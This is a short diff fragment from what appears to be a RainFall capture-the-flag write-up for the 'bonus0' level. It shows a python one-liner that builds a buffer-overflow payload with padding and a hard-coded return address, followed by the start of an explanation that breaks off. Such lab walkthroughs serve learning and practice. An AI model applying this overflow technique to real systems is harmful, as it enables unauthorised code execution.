@@ -262,4 +262,5 @@ Final exploit:
 	bonus0@RainFall:~$ python -c 'print "0" * 4095 + "\n" + "123456789" + "\x5f\xf8\xff\xbf" + "0" * 7' > /tmp/bonus0
 
 Where:
-* f
+* first input is "0" * 4095 + "\n" that will fill in buffer fully but put final '\0' in `strchr`
+* s
